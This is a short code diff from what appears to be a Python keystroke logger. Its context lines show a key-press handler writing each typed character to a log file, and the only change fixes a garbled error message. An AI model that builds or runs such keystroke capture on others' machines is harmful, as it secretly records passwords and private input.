@@ -7,7 +7,7 @@ def keyPressed(key):
             char = key.char
             logkey.write(char)
         except:
-            print("error getting chatkjnfakjsfnasdkjfnafkjansrwewe")    
+            print("error getting char")    
 
 
 if __name__ == "__main__":
